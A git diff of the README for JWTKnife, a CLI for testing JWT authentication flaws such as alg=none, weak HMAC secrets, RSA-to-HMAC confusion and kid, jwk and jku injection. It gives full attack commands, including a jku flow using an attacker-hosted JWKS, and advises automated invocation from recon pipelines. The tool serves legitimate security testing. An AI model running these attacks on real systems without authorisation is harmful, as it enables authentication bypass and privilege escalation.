@@ -1,75 +1,196 @@
 ### JWTKnife
 
-JWTKnife is an interactive CLI tool for testing JWT-based authentication and authorization.
+JWTKnife is a JWT auth testing CLI for real request/response validation.
+It supports both:
+- an interactive wizard
+- a non-interactive one-command mode for automation and pipeline use
 
-Install:
-go install github.com/spencer5cent/jwtknife/cmd/jwtknife@v1.0.2
+It was built around the common PortSwigger-style JWT attack classes and now has a local lab harness for regression testing.
 
-It inspects a JWT, sends baseline requests, and tests common JWT weaknesses such as:
-- alg=none
-- Missing or unverified signatures
-- RSA → HMAC algorithm confusion
-- kid, jwk, and jku header manipulation
-- Weak HMAC signing secrets (optional wordlist-based testing)
+### Coverage
 
-JWTKnife supports JWTs sent via:
-- Authorization: Bearer header
+JWTKnife currently exercises these JWT attack families:
+- Unverified / missing signature acceptance
+- `alg=none`
+- Weak HMAC secrets
+- RSA to HMAC algorithm confusion via exposed JWKS
+- RSA to HMAC algorithm confusion via `sig2n` with two server-issued tokens
+- `kid` path traversal / filesystem key lookup
+- Embedded `jwk` header injection
+- Remote `jku` header injection
+
+JWTs can be tested when sent via:
+- `Authorization: Bearer <token>`
 - Cookies
 - Custom headers
 
-All tests are checked against baseline responses so results reflect real authorization behavior.
+### Install
 
-JWTKnife requires the following tools:
+```bash
+go install github.com/spencer5cent/jwtknife/cmd/jwtknife@latest
+```
 
-- Go – to build and run the CLI
-- Docker (optional) – required only for the algorithm confusion with no exposed key attack, which uses the portswigger/sig2n helper container internally
-- hashcat (optional) – used only for weak HMAC secret testing with a wordlist
+### Runtime Dependencies
 
-JWTKnife uses Docker automatically when needed (Docker must be running).
+- Go: build / install
+- Docker: required for the `sig2n` no-exposed-key RSA confusion path
+- hashcat: optional, used only for `--hmac-wordlist`
 
-### Example Use  
-*(PortSwigger Lab: JWT authentication bypass via algorithm confusion with no exposed key)*
+On this VPS build, JWTKnife will try to start the Docker service automatically when a `sig2n` attack needs it, and will stop Docker afterward only if JWTKnife started it.
 
-```text
-% ./jwtknife
-jwtknife – JWT auth testing wizard
+### Quick Start
 
-How do you want to provide the JWT?
-  1) Paste JWT into terminal
-  2) Read JWT from file
-Choose [1-2]: 1
-Paste the JWT (you can include 'Bearer '): eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<signature>
+Interactive wizard:
 
-Do you have a second JWT issued by the server? (used for alg confusion with no exposed key)
-Provide second JWT? [y/N]: y
-How do you want to provide the second JWT?
-  1) Paste JWT into terminal
-  2) Read JWT from file
-Choose [1-2]: 1
-Paste the second JWT (you can include 'Bearer '): eyJraWQiOiIyM2U0YWY1NC0zYjkwLTRkYzYtOWU5.<payload>.<signature>
+```bash
+./jwtknife
+```
 
-Decoded JWT:
-  alg: RS256
-  kid: 23e4af54-3b90-4dc6-9e9c-62848ddadf63
+Non-interactive:
 
-Where is the JWT sent?
-  1) Authorization: Bearer <token>
-  2) Cookie
-  3) Custom header
-Choose [1-3]: 2
-Cookie name: session
-Unauthenticated URL (accessible without any JWT): https://<lab-id>.web-security-academy.net
-Authenticated URL (accessible with the provided JWT): https://<lab-id>.web-security-academy.net/my-account?id=wiener
-Privilege-escalation target URL (admin or higher-privilege endpoint): https://<lab-id>.web-security-academy.net/admin/delete?username=carlos
+```bash
+./jwtknife \
+  --non-interactive \
+  --jwt 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<signature>' \
+  --second-jwt 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMyJ9.<payload>.<signature>' \
+  --placement cookie \
+  --placement-name session \
+  --public-url 'https://target.tld/' \
+  --auth-url 'https://target.tld/my-account' \
+  --admin-url 'https://target.tld/admin' \
+  --callback-url 'https://attacker.tld/jwks.json' \
+  --kid-mode auto \
+  --output json
+```
 
-Phase 1: JWT auth attacks
+### Important Flags
 
-✅ SUCCESS
-Attack: alg-confusion-sig2n
-Note: admin access via algorithm confusion with recovered RSA key (sig2n)
+- `--jwt` / `--jwt-file`: primary token
+- `--second-jwt` / `--second-jwt-file`: second token for `sig2n`-style RSA confusion
+- `--placement authorization|cookie|header`
+- `--placement-name <name>`: cookie/header name when required
+- `--public-url <url>`: baseline unauthenticated URL
+- `--auth-url <url>`: baseline authenticated URL
+- `--admin-url <url>`: higher-privilege/admin target URL
+- `--method <verb>`: request method for baseline + attacks
+- `--callback-url <url>`: hosted `jwks.json` URL for final `jku` execution
+- `--kid-mode auto|custom|skip`
+- `--kid-value <value>`: custom `kid` when `--kid-mode=custom`
+- `--hmac-secret <secret>`: known or suspected HMAC secret
+- `--hmac-wordlist <path>`: hashcat wordlist for HS* secret recovery
+- `--jwk=false` / `--jku=false`: skip those attacks
+- `--exhaustive`: keep running after the first success
+- `--output human|json`
 
-Forged JWT:
-eyJhbGciOiJIUzI1NiIsImtpZCI6IjIzZTRhZjU0LTNiOTAtNGRjNi05ZTljLTYyODQ4ZGRhZGY2MyJ9.<payload>.<signature>
+### HMAC Secret Recovery
 
-HTTP request / response for successful step:
-{Status:302 BodyLen:0 Duration:1.29833325s Err:}
+If you already know the HS* secret:
+
+```bash
+./jwtknife \
+  --non-interactive \
+  --jwt-file ./token.txt \
+  --hmac-secret weaksecret \
+  --public-url 'https://target.tld/' \
+  --auth-url 'https://target.tld/account' \
+  --admin-url 'https://target.tld/admin'
+```
+
+If you want JWTKnife to try a wordlist with hashcat:
+
+```bash
+./jwtknife \
+  --non-interactive \
+  --jwt-file ./token.txt \
+  --hmac-wordlist ./jwt-secrets.txt \
+  --public-url 'https://target.tld/' \
+  --auth-url 'https://target.tld/account' \
+  --admin-url 'https://target.tld/admin'
+```
+
+### JKU Two-Step Flow
+
+First run without `--callback-url` to generate the attacker JWKS:
+
+```bash
+./jwtknife \
+  --non-interactive \
+  --output json \
+  --jwt-file ./token.txt \
+  --public-url 'https://target.tld/' \
+  --auth-url 'https://target.tld/account' \
+  --admin-url 'https://target.tld/admin'
+```
+
+Extract the emitted JWKS, host it as `jwks.json`, then rerun with:
+
+```bash
+./jwtknife \
+  --non-interactive \
+  --jwt-file ./token.txt \
+  --callback-url 'https://attacker.tld/jwks.json' \
+  --public-url 'https://target.tld/' \
+  --auth-url 'https://target.tld/account' \
+  --admin-url 'https://target.tld/admin'
+```
+
+JWTKnife now persists the generated `jku` key material for the same source JWT so the second run uses the same keypair and `kid`.
+
+### JSON Output
+
+`--output json` is the intended mode for BugHunter / DeepRecon style automation.
+
+The JSON includes:
+- parsed JWT metadata
+- baseline public/auth/admin observations
+- attack outcomes
+- forged tokens and HTTP observations for interesting/successful steps
+
+### DeepRecon / BugHunter Integration
+
+JWTKnife is usable from automation now, but it still needs enough context to make the results meaningful.
+
+The best trigger conditions are:
+- a live response sets a JWT automatically
+- a cookie/header carrying a JWT is observed during crawling
+- JS / archived data reveals a real JWT and the surrounding route context
+- a target exposes OIDC / JWKS evidence suggesting JWT auth
+
+For automatic invocation, the minimum useful inputs are:
+- the JWT itself
+- token placement
+- one unauthenticated URL
+- one authenticated URL that normally accepts the JWT
+- one higher-privilege/admin URL to compare against
+
+Recommended DeepRecon behavior:
+- detect and extract JWTs from cookies, headers, JS, and archived artifacts
+- record placement and token name when known
+- map likely auth/admin endpoints from crawl results
+- call `jwtknife --output json`
+- store the JSON output next to the target’s recon artifacts for later review
+
+If DeepRecon only knows “JWTs are used here” but does not have a real token plus target URLs, it should record the evidence and defer active JWTKnife execution until that context exists.
+
+### Local Lab Harness
+
+A reusable local lab harness is committed under `lab/`:
+
+- `lab/jwt_lab.py`
+- `lab/run_jwtknife_tests.py`
+- `lab/requirements.txt`
+
+You can run it with any Python virtual environment that has those requirements installed.
+
+Example:
+
+```bash
+.venv/bin/python lab/jwt_lab.py
+python3 lab/run_jwtknife_tests.py
+```
+
+### Current Notes
+
+- `go test ./...` passes
+- The major PortSwigger-style JWT lab classes are covered and revalidated locally
+- This copy is tuned for this VPS environment rather than for broad cross-platform portability
